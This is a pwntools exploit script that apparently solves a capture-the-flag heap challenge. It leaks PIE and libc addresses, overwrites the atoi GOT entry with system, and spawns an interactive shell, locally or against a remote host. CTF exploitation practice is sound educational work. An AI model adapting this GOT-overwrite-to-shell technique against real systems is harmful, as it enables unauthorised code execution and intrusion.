#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chall_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
brva 0x0137A
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def create_level(idx: int):
    io.sendlineafter(b":", b"1")
    io.sendlineafter(b":", str(idx).encode())

def edit_level(data: bytes):
    io.sendlineafter(b":", b"2")
    io.sendlineafter(b": ", data)

def test_level():
    io.sendlineafter(b":", b"3")
    io.recvuntil(b"data: ")
    data = io.recvline()
    return data

def explore_level(idx: int):
    io.sendlineafter(b":", b"4")
    io.sendlineafter(b":", str(idx).encode())

def reset():
    io.sendlineafter(b":", b"5")

def solve():

    io.recvuntil(b"gift: ")
    main_leak = int(io.recvline().strip(), 16)
    exe.address = main_leak - exe.sym["main"]
    info("pie base: %#x", exe.address)

    create_level(0)
    create_level(1)

    explore_level(0)
    edit_level(b"A"*48 + p64(exe.got["atoi"] - 64))
    reset()

    explore_level(1)
    explore_level(0)

    atoi = u64(test_level()[:8])
    libc.address = atoi - libc.sym["atoi"]
    info("leak: %#x", libc.address)

    edit_level(p64(libc.sym["system"]))

    io.sendline(b"bash")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

